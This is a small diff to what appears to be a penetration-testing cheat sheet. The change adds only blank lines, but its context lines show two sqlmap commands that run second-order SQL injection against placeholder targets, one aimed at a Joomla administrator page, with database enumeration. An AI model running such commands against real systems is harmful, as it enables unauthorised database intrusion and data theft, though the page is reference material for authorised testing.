@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:24:23.713186+00:00'
 python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
 sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
 ```
+
+
